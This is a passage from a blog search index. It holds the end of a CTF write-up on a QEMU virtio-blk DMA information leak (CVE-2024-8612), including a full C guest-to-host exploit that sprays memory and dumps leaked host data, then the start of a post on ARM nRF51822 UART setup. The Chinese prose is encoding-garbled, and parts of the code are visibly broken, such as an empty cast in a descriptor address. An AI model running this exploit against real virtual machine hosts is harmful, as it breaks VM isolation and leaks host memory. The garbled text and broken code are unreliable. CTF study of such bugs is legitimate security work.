mmio_write32(&amp;common_cfg-&gt;driver_feature_select, 0);\n    mmio_write32(&amp;common_cfg-&gt;driver_feature, 0); // disable all features\n    mmio_write8(&amp;common_cfg-&gt;device_status, VIRTIO_CONFIG_S_FEATURES_OK | VIRTIO_CONFIG_S_DRIVER | VIRTIO_CONFIG_S_ACKNOWLEDGE);\n    assert(mmio_read8(&amp;common_cfg-&gt;device_status) &amp; VIRTIO_CONFIG_S_FEATURES_OK);\n\n\n    // alloc dma memory\n    int dma_fd = open(\"/dev/mem\", O_RDWR | O_SYNC);\n    if(dma_fd &lt; 0){\n        ERR(\"Open dma\");\n    }\n    dma_mem = mmap((void*)0x3ffdd000, 0x3000, PROT_READ | PROT_WRITE, MAP_SHARED, dma_fd, 0x3ffdd000);\n    if(dma_mem == (volatile void*)-1){\n        ERR(\"mmap dma mem\");\n    }\n    *(volatile uint32_t*)dma_mem = 0x12345678;\n    printf(\"%x\\n\", *(volatile uint32_t*)dma_mem);\n    *(volatile uint32_t*)dma_mem = 0;\n    printf(\"dma_mem: %p\\n\", dma_mem);\n    dma_data = dma_mem + 0x1000;\n    queue_desc = (struct virtq_desc*)dma_mem;\n    queue_avail = (struct virtq_avail*)((char*)queue_desc + 0x10 * VIRTIO_QUEUE_SIZE);\n    queue_used = (struct virtq_used*)((char*)dma_mem + 0x200);\n\n    // init queue\n    mmio_write16(&amp;common_cfg-&gt;queue_select, 0);\n    mmio_write16(&amp;common_cfg-&gt;queue_size, VIRTIO_QUEUE_SIZE);\n    mmio_write64(&amp;common_cfg-&gt;queue_desc, (size_t)0x3ffdd000);\n    mmio_write64(&amp;common_cfg-&gt;queue_driver, (size_t)0x3ffdd100);\n    mmio_write64(&amp;common_cfg-&gt;queue_device, (size_t)0x3ffdd200);\n    mmio_write16(&amp;common_cfg-&gt;queue_enable, 1);\n\n    mmio_write8(&amp;common_cfg-&gt;device_status, VIRTIO_CONFIG_S_DRIVER_OK | VIRTIO_CONFIG_S_FEATURES_OK | VIRTIO_CONFIG_S_DRIVER | VIRTIO_CONFIG_S_ACKNOWLEDGE);\n    puts(\"virtio init done\");\n}\nVulnerabilities\nCVE-2024-8612\nä»æ–‡ä»¶çš„å­—ç¬¦ä¸²ä¸­å¯å¾—çŸ¥ qemu çš„ç‰ˆæœ¬å·ä¸º qemu-8.0.0-rc2ï¼Œå­˜åœ¨ä¸€ä¸ªå…³äº virtio-blk-pci çš„ä¿¡æ¯æ³„æ¼æ¼æ´:\nCVE-2024-8612\nå…·ä½“åˆ©ç”¨è¿˜å¯ä»¥å‚è€ƒ:\nHEXACON2024 -\nDMAKiller: DMA to Escape from QEMU/KVM by Yongkang Jia, Yiming Tao &amp;\nXiao Lei,\nACTF2025-EasyDMA\nWriteup\nå½“ DMA è®¿é—®çš„åœ°å€æ˜¯ MMIO çš„ï¼Œä¼šä½¿ç”¨ bounce buffer\n/* Map a physical memory region into a host virtual address.\n * May map a subset of the requested range, given by and returned in *plen.\n * May return NULL if resources needed to perform the mapping are exhausted.\n * Use only for reads OR writes - not for read-modify-write operations.\n * Use cpu_register_map_client() to know when retrying the map operation is\n * likely to succeed.\n */\nvoid *address_space_map(AddressSpace *as,\n                        hwaddr addr,\n                        hwaddr *plen,\n                        bool is_write,\n                        MemTxAttrs attrs)\n{\n    hwaddr len = *plen;\n    hwaddr l, xlat;\n    MemoryRegion *mr;\n    FlatView *fv;\n\n    if (len == 0) {\n        return NULL;\n    }\n\n    l = len;\n    RCU_READ_LOCK_GUARD();\n    fv = address_space_to_flatview(as);\n    mr = flatview_translate(fv, addr, &amp;xlat, &amp;l, is_write, attrs);\n\n    if (!memory_access_is_direct(mr, is_write)) {\n        if (qatomic_xchg(&amp;bounce.in_use, true)) {\n            *plen = 0;\n            return NULL;\n        }\n               /* Avoid unbounded allocations */\n        l = MIN(l, TARGET_PAGE_SIZE);\n        bounce.buffer = qemu_memalign(TARGET_PAGE_SIZE, l);\n        bounce.addr = addr;\n        bounce.len = l;\n\n        memory_region_ref(mr);\n        bounce.mr = mr;\n        if (!is_write) {\n            flatview_read(fv, addr, MEMTXATTRS_UNSPECIFIED,\n                               bounce.buffer, l);\n        }\n\n        *plen = l;\n        return bounce.buffer;\n    }\n\t//...\n}\nåŒæ—¶ï¼Œé€šè¿‡ qemu_memalign å¾—åˆ°çš„å†…å­˜å¹¶æ²¡æœ‰åˆå§‹åŒ–ã€‚\nstatic int virtio_blk_handle_request(VirtIOBlockReq *req, MultiReqBuffer *mrb)\n{\n    uint32_t type;\n    struct iovec *in_iov = req-&gt;elem.in_sg;\n    struct iovec *out_iov = req-&gt;elem.out_sg;\n    unsigned in_num = req-&gt;elem.in_num;\n    unsigned out_num = req-&gt;elem.out_num;\n    VirtIOBlock *s = req-&gt;dev;\n    VirtIODevice *vdev = VIRTIO_DEVICE(s);\n    \n    if (req-&gt;elem.out_num &lt; 1 || req-&gt;elem.in_num &lt; 1) {\n        virtio_error(vdev, \"virtio-blk missing headers\");\n        return -1;\n    }\n\n    if (unlikely(iov_to_buf(out_iov, out_num, 0, &amp;req-&gt;out,\n                            sizeof(req-&gt;out)) != sizeof(req-&gt;out))) {\n        virtio_error(vdev, \"virtio-blk request outhdr too short\");\n        return -1;\n    }\n\n    iov_discard_front_undoable(&amp;out_iov, &amp;out_num, sizeof(req-&gt;out),\n                               &amp;req-&gt;outhdr_undo);\n\n    if (in_iov[in_num - 1].iov_len &lt; sizeof(struct virtio_blk_inhdr)) {\n        virtio_error(vdev, \"virtio-blk request inhdr too short\");\n        iov_discard_undo(&amp;req-&gt;outhdr_undo);\n        return -1;\n    }\n    \n    //...\n    \n    req-&gt;in_len = iov_size(in_iov, in_num);\n    \n    //...\n    \n    case VIRTIO_BLK_T_IN:\n    {\n        bool is_write = type &amp; VIRTIO_BLK_T_OUT;\n        req-&gt;sector_num = virtio_ldq_p(vdev, &amp;req-&gt;out.sector);\n\n        if (is_write) {\n            qemu_iovec_init_external(&amp;req-&gt;qiov, out_iov, out_num);\n            trace_virtio_blk_handle_write(vdev, req, req-&gt;sector_num,\n                                          req-&gt;qiov.size / BDRV_SECTOR_SIZE);\n        } else {\n            qemu_iovec_init_external(&amp;req-&gt;qiov, in_iov, in_num);\n            trace_virtio_blk_handle_read(vdev, req, req-&gt;sector_num,\n                                         req-&gt;qiov.size / BDRV_SECTOR_SIZE);\n        }\n\n        if (!virtio_blk_sect_range_ok(s, req-&gt;sector_num, req-&gt;qiov.size)) {\n            virtio_blk_req_complete(req, VIRTIO_BLK_S_IOERR);\n            block_acct_invalid(blk_get_stats(s-&gt;blk),\n                               is_write ? BLOCK_ACCT_WRITE : BLOCK_ACCT_READ);\n            virtio_blk_free_request(req);\n            return 0;\n        }\n        \n\t//...\n\n    default:\n    virtio_blk_req_complete(req, VIRTIO_BLK_S_UNSUPP);\n    virtio_blk_free_request(req);\n        \n}\nåœ¨ virtio_blk_handle_requestï¼Œå³ä½¿è¯·æ±‚ä¸åˆæ³•ï¼Œé•¿åº¦ä¹Ÿè¢«å†™å…¥åˆ° req-&gt;in_lenã€‚type ä¸åˆæ³•æ—¶ï¼Œç›´æ¥è°ƒç”¨ virtio_blk_req_complete\nè°ƒç”¨é“¾ï¼švirtio_blk_handle_request-&gt;virtio_blk_req_complete-&gt;virtqueue_push-&gt;virtqueue_fill-&gt;virtqueue_unmap_sg-&gt;dma_memory_unmap-&gt;address_space_unmap-&gt;address_space_write\nMemTxResult address_space_write(AddressSpace *as, hwaddr addr,\n                                MemTxAttrs attrs,\n                                const void *buf, int len)\n{\n    MemTxResult result;\n    __bufread(buf, len);\n    return result;\n}\nç”±äºç¼ºä¹ä¿æŠ¤ï¼Œæ•°æ®å¯ä»¥è¢«å†™åˆ° Common\nconfiguration éƒ¨åˆ†ï¼Œå¹¶ä¸”éƒ¨åˆ†ç©ºé—´å¯è¢«è¯»å‡ºã€‚\nExploit\né€šè¿‡å †å–·ï¼Œå°† flag å­—ç¬¦ä¸²å¡«å……åœ¨å†…å­˜ä¸­ã€‚åˆ©ç”¨ä¸Šè¿°æ¼æ´è¯»å‡ºå†…å­˜å†…å®¹ã€‚\n#include&lt;stddef.h&gt;\n#include&lt;stdlib.h&gt;\n#include&lt;unistd.h&gt;\n#include&lt;fcntl.h&gt;\n#include&lt;sys/mman.h&gt;\n#include&lt;string.h&gt;\n#include&lt;stdio.h&gt;\n#include&lt;assert.h&gt;\n#include&lt;stdint.h&gt;\n#include&lt;sys/io.h&gt;\n#include&lt;linux/stddef.h&gt;\n\n#define u8 uint8_t\n#define u16 uint16_t\n#define u32 uint32_t\n#define u64 uint64_t\n#define le16 u16\n#define le32 u32\n#define le64 u64\n\nstruct virtio_pci_cap {\n    u8 cap_vndr;\n    u8 cap_next;\n    u8 cap_len;\n    u8 cfg_type;\n    u8 bar;\n    u8 id;\n    u8 padding[2];\n    le32 offset;\n    le32 length;\n};\n\nstruct virtio_pci_common_cfg {\n    /* About the whole device. */\n    le32 device_feature_select; /* read-write */\n    le32 device_feature; /* read-only for driver */\n    le32 driver_feature_select; /* read-write */\n    le32 driver_feature; /* read-write */\n    le16 config_msix_vector; /* read-write */\n    le16 num_queues; /* read-only for driver */\n    u8 device_status; /* read-write */\n    u8 config_generation; /* read-only for driver */\n    /* About a specific virtqueue. */\n    le16 queue_select; /* read-write */\n    le16 queue_size; /* read-write */\n    le16 queue_msix_vector; /* read-write */\n    le16 queue_enable; /* read-write */\n    le16 queue_notify_off; /* read-only for driver */\n    le64 queue_desc; /* read-write */\n    le64 queue_driver; /* read-write */\n    le64 queue_device; /* read-write */\n    le16 queue_notify_data; /* read-only for driver */\n    le16 queue_reset; /* read-write */\n};\n\nstruct virtio_notify_cfg {\n    struct virtio_pci_cap cap;\n    le32 notify_off_multiplier;\n};\n\nstruct virtio_blk_config{\n    le64 capacity;\n    le32 size_max;\n    le32 seg_max;\n    struct virtio_blk_geometry {\n        le16 cylinders;\n        u8 heads;\n        u8 sectors;\n    } geometry;\n    le32 blk_size;\n    struct virtio_blk_topology {\n        // # of logical blocks per physical block (log2)\n        u8 physical_block_exp;\n        // offset of first aligned logical block\n        u8 alignment_offset;\n        // suggested minimum I/O size in blocks\n        le16 min_io_size;\n        // optimal (suggested maximum) I/O size in blocks\n        le32 opt_io_size;\n    } topology;\n    u8 writeback;\n    u8 unused0;\n    u16 num_queues;\n    le32 max_discard_sectors;\n    le32 max_discard_seg;\n    le32 discard_sector_alignment;\n    le32 max_write_zeroes_sectors;\n    le32 max_write_zeroes_seg;\n    u8 write_zeroes_may_unmap;\n    u8 unused1[3];\n    le32 max_secure_erase_sectors;\n    le32 max_secure_erase_seg;\n    le32 secure_erase_sector_alignment;\n};\n\nenum virtio_pci_cfg_type{\n    VIRTIO_PCI_CAP_COMMON_CFG = 0x1,\n    VIRTIO_PCI_CAP_NOTIFY_CFG = 0x2,\n    VIRTIO_PCI_CAP_ISR_CFG = 0x3,\n    VIRTIO_PCI_CAP_DEVICE_CFG = 0x4,\n    VIRTIO_PCI_CAP_PCI_CFG = 0x5,\n    VIRTIO_PCI_CAP_SHARED_MEMORY = 0x8,\n    VIRTIO_PCI_CAP_VENDOR_CFG = 0x9,\n};\n\n/* Feature bits */\n#define VIRTIO_BLK_F_SIZE_MAX\t1\t/* Indicates maximum segment size */\n#define VIRTIO_BLK_F_SEG_MAX\t2\t/* Indicates maximum # of segments */\n#define VIRTIO_BLK_F_GEOMETRY\t4\t/* Legacy geometry available  */\n#define VIRTIO_BLK_F_RO\t\t5\t/* Disk is read-only */\n#define VIRTIO_BLK_F_BLK_SIZE\t6\t/* Block size of disk is available*/\n#define VIRTIO_BLK_F_FLUSH\t9\t/* Flush command supported */\n#define VIRTIO_BLK_F_TOPOLOGY\t10\t/* Topology information is available */\n#define VIRTIO_BLK_F_MQ\t\t12\t/* support more than one vq */\n#define VIRTIO_BLK_F_DISCARD\t13\t/* DISCARD is supported */\n#define VIRTIO_BLK_F_WRITE_ZEROES\t14\t/* WRITE ZEROES is supported */\n#define VIRTIO_BLK_F_SECURE_ERASE\t16 /* Secure Erase is supported */\n\n/* Status byte for guest to report progress, and synchronize features. */\n/* We have seen device and processed generic fields (VIRTIO_CONFIG_F_VIRTIO) */\n#define VIRTIO_CONFIG_S_ACKNOWLEDGE\t1\n/* We have found a driver for the device. */\n#define VIRTIO_CONFIG_S_DRIVER\t\t2\n/* Driver has used its parts of the config, and is happy */\n#define VIRTIO_CONFIG_S_DRIVER_OK\t4\n/* Driver has finished configuring features */\n#define VIRTIO_CONFIG_S_FEATURES_OK\t8\n/* Device entered invalid state, driver must reset it */\n#define VIRTIO_CONFIG_S_NEEDS_RESET\t0x40\n/* We've given up on this device. */\n#define VIRTIO_CONFIG_S_FAILED\t\t0x80\n\n#define VIRTIO_QUEUE_SIZE 0x10\n\nstruct virtq_desc {\n    /* Address (guest-physical). */\n    le64 addr;\n    /* Length. */\n    le32 len;\n/* This marks a buffer as continuing via the next field. */\n#define VIRTQ_DESC_F_NEXT 1\n/* This marks a buffer as device write-only (otherwise device read-only). */\n#define VIRTQ_DESC_F_WRITE 2\n/* This means the buffer contains a list of buffer descriptors. */\n#define VIRTQ_DESC_F_INDIRECT 4\n    /* The flags as indicated above. */\n    le16 flags;\n    /* Next field if flags &amp; NEXT */\n    le16 next;\n};\n\nstruct virtq_avail {\n#define VIRTQ_AVAIL_F_NO_INTERRUPT 1\n    le16 flags;\n    le16 idx;\n    le16 ring[VIRTIO_QUEUE_SIZE];\n    le16 used_event; /* Only if VIRTIO_F_EVENT_IDX */\n};\n\nstruct virtq_used_elem {\n    /* Index of start of used descriptor chain. */\n    le32 id;\n\n    /*\n    * The number of bytes written into the device writable portion of\n    * the buffer described by the descriptor chain.\n    */\n    le32 len;\n};\n\nstruct virtq_used {\n#define VIRTQ_USED_F_NO_NOTIFY 1\n    le16 flags;\n    le16 idx;\n    struct virtq_used_elem ring[VIRTIO_QUEUE_SIZE];\n    le16 avail_event; /* Only if VIRTIO_F_EVENT_IDX */\n};\n\nstruct virtio_blk_req {\n    le32 type;\n    le32 reserved;\n    le64 sector;\n    u8 data[0];\n    // u8 status;\n};\n\n#define VIRTIO_BLK_T_IN 0\n#define VIRTIO_BLK_T_OUT 1\n#define VIRTIO_BLK_T_FLUSH 4\n#define VIRTIO_BLK_T_GET_ID 8\n#define VIRTIO_BLK_T_GET_LIFETIME 10\n#define VIRTIO_BLK_T_DISCARD 11\n#define VIRTIO_BLK_T_WRITE_ZEROES 13\n#define VIRTIO_BLK_T_SECURE_ERASE 14\n\n\nvoid print_cap(struct virtio_pci_cap* cap){\n    printf(\"cap_len: %x\\n\", cap-&gt;cap_len);\n    switch(cap-&gt;cfg_type){\n        case VIRTIO_PCI_CAP_COMMON_CFG:\n            printf(\"cfg_type: common\\n\");\n            break;\n        case VIRTIO_PCI_CAP_NOTIFY_CFG:\n            printf(\"cfg_type: notify\\n\");\n            break;\n        case VIRTIO_PCI_CAP_ISR_CFG:\n            printf(\"cfg_type: isr\\n\");\n            break;\n        case VIRTIO_PCI_CAP_DEVICE_CFG:\n            printf(\"cfg_type: device\\n\");\n            break;\n        case VIRTIO_PCI_CAP_PCI_CFG:\n            printf(\"cfg_type: pci\\n\");\n            break;\n        case VIRTIO_PCI_CAP_SHARED_MEMORY:\n            printf(\"cfg_type: shared memory\\n\");\n            break;\n        case VIRTIO_PCI_CAP_VENDOR_CFG:\n            printf(\"cfg_type: vendor\\n\");\n            break;\n        default:\n            printf(\"cfg_type: unknown\\n\");\n            break;\n    }\n    printf(\"bar: %x\\n\", cap-&gt;bar);\n    printf(\"id: %x\\n\", cap-&gt;id);\n    printf(\"offset: %x\\n\", cap-&gt;offset);\n    printf(\"length: %x\\n\", cap-&gt;length);\n}\n\nvoid ERR(const char* buf){\n    perror(buf);\n    abort();\n}\n\nvoid LOG(const char* buf){\n    write(2, buf, strlen(buf));\n}\n\nvolatile char* readflag_mmio = NULL;\nvolatile char* virtio_mmio = NULL;\nvolatile char* virtio_common_mmio = NULL;\nvolatile struct virtio_notify_cfg* virtio_notify_mmio = NULL;\nvolatile char* virtio_isr_mmio = NULL;\nvolatile char* virtio_device_mmio = NULL;\nvolatile char* dma_mem = NULL;\nvolatile char* dma_data = NULL;\nvolatile struct virtq_desc* queue_desc = NULL;\nvolatile struct virtq_avail* queue_avail = NULL;\nvolatile struct virtq_used* queue_used = NULL;\n\nvoid init_readflag(){\n    int mmio_fd = open(\"/sys/devices/pci0000:00/0000:00:05.0/resource0\", O_RDWR | O_SYNC);\n    if(mmio_fd &lt; 0){\n        ERR(\"Open readflag\");\n    }\n    readflag_mmio = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);\n    if(readflag_mmio == (volatile void*)-1){\n        ERR(\"mmap mmio_mem\");\n    }\n    close(mmio_fd);\n\n    puts(\"readflag init done\");\n}\n\nuint8_t mmio_read8(void* addr){\n    return *(volatile uint8_t*)addr;\n}\n\nuint16_t mmio_read16(void* addr){\n    return *(volatile uint16_t*)addr;\n}\n\nuint32_t mmio_read32(void* addr){\n    return *(volatile uint32_t*)addr;\n}\n\nuint64_t mmio_read64(void* addr){\n    return *(volatile uint64_t*)addr;\n}\n\nvoid mmio_write8(void* addr, uint8_t val){\n    *(volatile uint8_t*)addr = val;\n}\n\nvoid mmio_write16(void* addr, uint16_t val){\n    *(volatile uint16_t*)addr = val;\n}\n\nvoid mmio_write32(void* addr, uint32_t val){\n    *(volatile uint32_t*)addr = val;\n}\n\nvoid mmio_write64(void* addr, uint64_t val){\n    *(volatile uint64_t*)addr = val;\n}\n\nvoid mb(){\n    asm volatile(\"mfence\":::\"memory\");\n}\n\nvoid init_virtio() {\n    int fd = open(\"/sys/devices/pci0000:00/0000:00:04.0/config\", O_RDONLY);\n    if(fd &lt; 0){\n        ERR(\"Open virtio config\");\n    }\n    struct virtio_pci_cap cap;\n    char* config = malloc(0x1000);\n    int bytes_read = read(fd, config, 0x1000);\n    if(bytes_read &lt; 0){\n        ERR(\"Read virtio config\");\n    }\n\n    fd = open(\"/sys/devices/pci0000:00/0000:00:04.0/resource4\", O_RDWR | O_SYNC);\n    if(fd &lt; 0){\n        ERR(\"Open virtio resource4\");\n    }\n    virtio_mmio = mmap(0, 0x4000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);\n    if(virtio_mmio == (volatile void*)-1){\n        ERR(\"mmap virtio mem\");\n    }\n    close(fd);\n\n    u8 cap_ptr = *(u8*)(config+0x34);\n    while(cap_ptr != 0){\n        if(config[cap_ptr] != 0x9){\n            cap_ptr = *(u8*)(config+cap_ptr+1);\n            continue;\n        }\n        memcpy(&amp;cap, config+cap_ptr, sizeof(cap));\n        print_cap(&amp;cap);\n        switch(cap.cfg_type){\n            case VIRTIO_PCI_CAP_COMMON_CFG:\n                virtio_common_mmio = virtio_mmio + cap.offset;\n                break;\n            case VIRTIO_PCI_CAP_NOTIFY_CFG:\n                virtio_notify_mmio = (struct virtio_notify_cfg*)((size_t)virtio_mmio + cap.offset);\n                break;\n            case VIRTIO_PCI_CAP_ISR_CFG:\n                virtio_isr_mmio = virtio_mmio + cap.offset;\n                break;\n            case VIRTIO_PCI_CAP_DEVICE_CFG:\n                virtio_device_mmio = virtio_mmio + cap.offset;\n                break;\n            default:\n                break;\n        }\n        cap_ptr = cap.cap_next;\n    }\n    close(fd);\n    free(config);\n\n    struct virtio_pci_common_cfg* common_cfg = (struct virtio_pci_common_cfg*)virtio_common_mmio;\n    mmio_write32(&amp;common_cfg-&gt;device_feature_select, 0);\n    printf(\"device_feature[0]: %x\\n\", mmio_read32(&amp;common_cfg-&gt;device_feature));\n    mmio_write32(&amp;common_cfg-&gt;device_feature_select, 1);\n    printf(\"device_feature[1]: %x\\n\", mmio_read32(&amp;common_cfg-&gt;device_feature));\n    mmio_write32(&amp;common_cfg-&gt;driver_feature_select, 0);\n    printf(\"driver_feature[0]: %x\\n\", mmio_read32(&amp;common_cfg-&gt;driver_feature));\n    mmio_write32(&amp;common_cfg-&gt;driver_feature_select, 1);\n    printf(\"driver_feature[1]: %x\\n\", mmio_read32(&amp;common_cfg-&gt;driver_feature));\n\n    struct virtio_blk_config* blk_cfg = (struct virtio_blk_config*)virtio_device_mmio;\n    printf(\"capacity: %lx\\n\", mmio_read64(&amp;blk_cfg-&gt;capacity));\n    printf(\"size_max: %x\\n\", mmio_read32(&amp;blk_cfg-&gt;size_max));\n    printf(\"seg_max: %x\\n\", mmio_read32(&amp;blk_cfg-&gt;seg_max));\n    printf(\"geometry.cylinders: %x\\n\", mmio_read16(&amp;blk_cfg-&gt;geometry.cylinders));\n    printf(\"geometry.heads: %x\\n\", mmio_read8(&amp;blk_cfg-&gt;geometry.heads));\n    printf(\"geometry.sectors: %x\\n\", mmio_read8(&amp;blk_cfg-&gt;geometry.sectors));\n    printf(\"blk_size: %x\\n\", mmio_read32(&amp;blk_cfg-&gt;blk_size));\n\n    // reset device\n    mmio_write8(&amp;common_cfg-&gt;device_status, 0);\n    mmio_write8(&amp;common_cfg-&gt;device_status, VIRTIO_CONFIG_S_ACKNOWLEDGE);\n    mmio_write8(&amp;common_cfg-&gt;device_status, VIRTIO_CONFIG_S_DRIVER | VIRTIO_CONFIG_S_ACKNOWLEDGE);\n    mmio_write32(&amp;common_cfg-&gt;driver_feature_select, 0);\n    mmio_write32(&amp;common_cfg-&gt;driver_feature, 0); // disable all features\n    mmio_write8(&amp;common_cfg-&gt;device_status, VIRTIO_CONFIG_S_FEATURES_OK | VIRTIO_CONFIG_S_DRIVER | VIRTIO_CONFIG_S_ACKNOWLEDGE);\n    assert(mmio_read8(&amp;common_cfg-&gt;device_status) &amp; VIRTIO_CONFIG_S_FEATURES_OK);\n\n\n    // alloc dma memory\n    int dma_fd = open(\"/dev/mem\", O_RDWR | O_SYNC);\n    if(dma_fd &lt; 0){\n        ERR(\"Open dma\");\n    }\n    dma_mem = mmap((void*)0x3ffdd000, 0x3000, PROT_READ | PROT_WRITE, MAP_SHARED, dma_fd, 0x3ffdd000);\n    if(dma_mem == (volatile void*)-1){\n        ERR(\"mmap dma mem\");\n    }\n    *(volatile uint32_t*)dma_mem = 0x12345678;\n    printf(\"%x\\n\", *(volatile uint32_t*)dma_mem);\n    *(volatile uint32_t*)dma_mem = 0;\n    printf(\"dma_mem: %p\\n\", dma_mem);\n    dma_data = dma_mem + 0x1000;\n    queue_desc = (struct virtq_desc*)dma_mem;\n    queue_avail = (struct virtq_avail*)((char*)queue_desc + 0x10 * VIRTIO_QUEUE_SIZE);\n    queue_used = (struct virtq_used*)((char*)dma_mem + 0x200);\n\n    // init queue\n    mmio_write16(&amp;common_cfg-&gt;queue_select, 0);\n    mmio_write16(&amp;common_cfg-&gt;queue_size, VIRTIO_QUEUE_SIZE);\n    mmio_write64(&amp;common_cfg-&gt;queue_desc, (size_t)0x3ffdd000);\n    mmio_write64(&amp;common_cfg-&gt;queue_driver, (size_t)0x3ffdd100);\n    mmio_write64(&amp;common_cfg-&gt;queue_device, (size_t)0x3ffdd200);\n    mmio_write16(&amp;common_cfg-&gt;queue_enable, 1);\n\n    mmio_write8(&amp;common_cfg-&gt;device_status, VIRTIO_CONFIG_S_DRIVER_OK | VIRTIO_CONFIG_S_FEATURES_OK | VIRTIO_CONFIG_S_DRIVER | VIRTIO_CONFIG_S_ACKNOWLEDGE);\n    puts(\"virtio init done\");\n}\n\nvoid spray(){\n    for(int i = 0xfff; i &gt; 0x28; i-=4){\n        mmio_write32((void*)readflag_mmio, i);\n    }\n}\n\nvoid hexdump(void* addr, size_t size){\n    // dump 4 bytes per time\n    for(int i = 0; i &lt; size; i+=4){\n        uint32_t val = *(volatile uint32_t*)(addr+i);\n        for(int j = 0; j &lt; 4; j++){\n            uint8_t chr = (val &gt;&gt; (j*8)) &amp; 0xff;\n            if(chr &gt;= 0x20 &amp;&amp; chr &lt;= 0x7e){\n                putchar(chr);\n            }else{\n                putchar('?');\n            }\n        }\n    }\n}\n\nint main(){\n    setbuf(stdout, NULL);\n    init_readflag();\n    init_virtio();\n\n    volatile struct virtio_blk_req* req = (struct virtio_blk_req*)dma_data;\n    req-&gt;type = 0xffffffffu;\n    req-&gt;sector = 0;\n    req-&gt;reserved = 0;\n\n    queue_desc[0].addr = (size_t)req;\n    queue_desc[0].len = 0x10;\n    queue_desc[0].flags = VIRTQ_DESC_F_NEXT;\n    queue_desc[0].next = 1;\n    queue_desc[1].addr = (size_t);\n    queue_desc[1].len = 0xfff;\n    queue_desc[1].flags = VIRTQ_DESC_F_WRITE | VIRTQ_DESC_F_NEXT;\n    queue_desc[1].next = 2;\n    queue_desc[2].addr = (size_t)dma_data + 0xa00;\n    queue_desc[2].len = 1;\n    queue_desc[2].flags = VIRTQ_DESC_F_WRITE;\n    queue_desc[2].next = 0;\n\n    queue_avail-&gt;flags = 1;\n    queue_avail-&gt;ring[0] = 0;\n    queue_avail-&gt;idx = 1;\n    mb();\n    mmio_write8((void*)virtio_isr_mmio, 1);\n    struct virtio_pci_common_cfg* common_cfg = (struct virtio_pci_common_cfg*)virtio_common_mmio;\n    void* notify_addr = (void*)((uintptr_t)virtio_notify_mmio + mmio_read32((void*)&amp;virtio_notify_mmio-&gt;cap.offset) + mmio_read16(&amp;common_cfg-&gt;queue_notify_off) * mmio_read32((void*)&amp;virtio_notify_mmio-&gt;notify_off_multiplier));\n    puts(\"--------------------------------\");\n    for(int i = 0; i &lt; 0x100; i+=4){\n        spray();\n    }\n    mmio_write16(notify_addr, 0);\n    puts(\"--------------------------------\");\n    hexdump((char*)virtio_common_mmio + 0x000, 0x100);\n\n    munmap(dma_mem, 0x3000);\n    munmap(virtio_mmio, 0x4000);\n    munmap(readflag_mmio, 0x1000);\n}\nReferences\n\n\n\nVirtual\nI/O Device (VIRTIO) Version 1.1â†©ï¸\nVirtqueues\nand virtio ring: How the data travelsâ†©ï¸\nMemory-mapped\nI/O and port-mapped I/Oâ†©ï¸\n\n\n","categories":["CTF"],"tags":["pwn","qemu","virtio","dma"]},{"title":"ARM Bare metal try","url":"/categories/Pwn/Study/arm-bare-metal-helloworld/","content":"Foreword\næƒ³ç»™ä»Šå¹´çš„ HGAME Mini\n2025 å‡ºä¸€é“ç®€å•çš„ Pwn é¢˜ï¼Œçªç„¶æƒ³ç€ä¹‹å‰çš„é¢˜ç›®ä¼¼ä¹æ²¡æœ‰æ¶‰åŠåˆ° IoT\nPwn çš„ï¼ˆè™½ç„¶å¯èƒ½æ˜¯å› ä¸ºä¸å¤ªç®— pwn çš„å…¥é—¨å†…å®¹ï¼Ÿï¼‰ï¼Œæ‰“ç®—æ¥ä¸€é“æ¯”è¾ƒç®€å•çš„ï¼Œæ­£å¥½å­¦ä¹ ä¸€ä¸‹ IoT çš„ç›¸å…³çŸ¥è¯†å§ã€‚\n\nChoose a Platform\nIoT è®¾å¤‡çš„ ISA ä¸€èˆ¬ä½¿ç”¨ ARM, RISC-V, MIPSã€‚é¢˜ç›®è€ƒè™‘ä½¿ç”¨ nRF51822 based on\nARM Cortex-M0 SoC, QEMU å¯¹å…¶æœ‰è¾ƒå¥½æ”¯æŒã€‚\nqemu-system-arm \\\n  -M microbit \\\n  -cpu cortex-m0 \\\n  -nographic \\\n  -serial tcp:127.0.0.1:2333,server,telnet \\\n  -kernel main.elf \\\n  --gdb tcp::1234\nHello World\nTo communicate - UART1\nIn QEMU, a simulated serial port can serve as stdio.\nnRF51822 has one UART peripheral, we would use it to interact.\nFor convenience, using the official library nrfx to implement\nrelated functions, instead of defining addresses and operations by\nmyself.\nAlso, you can finish it with the manual.\n\n\nPin configuration\n\nHow to Transmit\n\n\nTransmission process\n\nnrfx defines a struct for parameters controlling uart.\ntypedef struct\n{\n    void                    * p_context;\n    nrfx_uart_event_handler_t handler;\n    uint8_t           const * p_tx_buffer;\n    uint8_t                 * p_rx_buffer;\n    uint8_t                 * p_rx_secondary_buffer;\n    volatile size_t           tx_buffer_length;\n    size_t                    rx_buffer_length;\n    size_t                    rx_secondary_buffer_length;\n    volatile size_t           tx_counter;\n    volatile size_t           rx_counter;\n    volatile bool             tx_abort;\n    bool                      rx_enabled;\n    nrfx_drv_state_t          state;\n    bool                      skip_gpio_cfg : 1;\n    bool                      skip_psel_cfg : 1;\n} uart_control_block_t;\nstatic uart_control_block_t m_cb[NRFX_UART_ENABLED_COUNT];\nnrfx_uart_tx() implenments this operation.\nnrfx_err_t nrfx_uart_tx(nrfx_uart_t const * p_instance,\n                        uint8_t const *     p_data,\n                        size_t              length)\n{\n    uart_control_block_t * p_cb = &amp;m_cb[p_instance-&gt;drv_inst_idx];\n\n    NRFX_ASSERT(p_cb-&gt;state == NRFX_DRV_STATE_INITIALIZED);\n    NRFX_ASSERT(p_data);\n    NRFX_ASSERT(length &gt; 0);\n\n    nrfx_err_t err_code;\n\n    if (nrfx_uart_tx_in_progress(p_instance))\n    {\n        err_code = NRFX_ERROR_BUSY;\n        NRFX_LOG_WARNING(\"Function: %s, error code: %s.\",\n                         __func__,\n                         NRFX_LOG_ERROR_STRING_GET(err_code));\n        return err_code;\n    }\n    p_cb-&gt;tx_buffer_length = length;\n    p_cb-&gt;p_tx_buffer      = p_data;\n    p_cb-&gt;tx_counter       = 0;\n    p_cb-&gt;tx_abort         = false;\n\n    NRFX_LOG_INFO(\"Transfer tx_len: %d.\", p_cb-&gt;tx_buffer_length);\n    NRFX_LOG_DEBUG(\"Tx data:\");\n    NRFX_LOG_HEXDUMP_DEBUG(p_cb-&gt;p_tx_buffer,\n                           p_cb-&gt;tx_buffer_length * sizeof(p_cb-&gt;p_tx_buffer[0]));\n\n    err_code = NRFX_SUCCESS;\n\n    